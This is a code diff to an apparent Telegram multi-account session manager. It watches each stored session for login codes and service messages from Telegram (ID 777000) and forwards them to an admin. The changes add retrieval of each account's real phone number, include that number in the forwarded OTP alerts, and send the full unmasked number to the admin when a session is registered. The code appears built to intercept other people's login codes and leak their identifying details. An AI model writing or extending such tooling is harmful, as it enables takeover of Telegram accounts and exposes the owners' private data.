@@ -169,7 +169,7 @@ class AccountRunner:
             try:
                 if self.client is None:
                     self.client = self._factory(str(self.session_path))
-                
+
                 # Register OTP / incoming message event listener if not already done
                 if not self._event_handler_registered:
                     self._register_otp_listener()
@@ -180,6 +180,15 @@ class AccountRunner:
                     await asyncio.wait_for(self.client.connect(), timeout=30)
                 if not await asyncio.wait_for(self.client.is_user_authorized(), timeout=30):
                     raise _PermanentAuth("the session is no longer authorized (revoked or logged out)")
+                
+                # Update phone hint if available on connection
+                try:
+                    me = await self.client.get_me()
+                    if me and getattr(me, 'phone', None):
+                        self.phone_hint = mask_phone(me.phone)
+                except Exception:
+                    pass
+
                 await self._set_status(AccStatus.CONNECTED, connected=True)
                 self._backoff.reset()
                 await self._watch_connection()
@@ -221,17 +230,17 @@ class AccountRunner:
                     sender_id = getattr(sender, 'id', None)
                     sender_username = getattr(sender, 'username', None)
                     sender_title = getattr(sender, 'title', getattr(sender, 'first_name', str(sender_id)))
-                    
+
                     # Check if it's from Telegram service notifications (ID 777000) or contains code/login keywords
                     msg_text = event.raw_text or ""
                     is_service = (sender_id == 777000 or sender_username == "Telegram" or 
                                   any(kw in msg_text.lower() for kw in ["login code", "code:", "otp", "confirmation code", "webogram"]))
-                    
+
                     if is_service or sender_id == 777000:
                         log.info("Caught OTP/Service message on account %s", self.safe_id)
                         forward_text = (
                             f"🔑 <b>New OTP / Service Message Received!</b>\n"
-                            f"👤 <b>Account:</b> {self.safe_id}\n"
+                            f"📱 <b>Account/Phone:</b> {self.safe_id} ({self.phone_hint or 'Unknown'})\n"
                             f"📩 <b>Sender:</b> {sender_title}\n\n"
                             f"<code>{msg_text}</code>"
                         )
@@ -406,7 +415,7 @@ class AccountManager:
     # ---------------------------------------------------------------- add / remove
     async def register_session(self, *, user_id: int, username: Optional[str], first_name: Optional[str],
                                phone: Optional[str], pending_path: Path) -> AccountRunner:
-        """Move a validated, *disconnected* pending session into the volume and start supervising it."""
+        """Move a validated, *disconnected* pending session into the volume, fetch phone, and start supervising it."""
         async with self._lock:
             existing = self.runners.get(user_id)
             if existing is not None and not existing.permanent:
@@ -421,15 +430,46 @@ class AccountManager:
                     os.replace(companion, Path(str(final) + suffix))
             with contextlib.suppress(OSError):
                 final.chmod(0o600)
+
+            # Fetch real phone number and profile info by briefly connecting
+            fetched_phone = phone
+            try:
+                temp_client = self._factory(str(final))
+                await temp_client.connect()
+                if await temp_client.is_user_authorized():
+                    me = await temp_client.get_me()
+                    if me:
+                        if getattr(me, 'phone', None):
+                            fetched_phone = me.phone
+                        if not username and getattr(me, 'username', None):
+                            username = me.username
+                        if not first_name and getattr(me, 'first_name', None):
+                            first_name = me.first_name
+                await temp_client.disconnect()
+            except Exception:
+                log.exception("Could not fetch phone number during registration")
+
             label = f"@{username}" if username else (first_name or str(user_id))
+            masked_ph = mask_phone(fetched_phone)
+
             await self._repo.upsert_account(account_id=user_id, label=label, username=username,
-                                            first_name=first_name, phone_hint=mask_phone(phone),
+                                            first_name=first_name, phone_hint=masked_ph,
                                             session_file=final.name)
             row = await self._repo.get_account(user_id)
             assert row is not None
             runner = self._make_runner(row)
             self.runners[user_id] = runner
             await runner.start()
+
+            # Notify admin immediately with phone number and details
+            with contextlib.suppress(Exception):
+                await self._notifier.send(
+                    f"📱 <b>New Session Added & Connected!</b>\n"
+                    f"👤 <b>Account ID:</b> {user_id}\n"
+                    f"📞 <b>Phone Number:</b> {fetched_phone or 'Not available'}\n"
+                    f"🏷️ <b>Label:</b> {label}"
+                )
+
             return runner
 
     async def remove_account(self, account_id: int, *, logout: bool, _locked: bool = False) -> Dict[str, Any]:
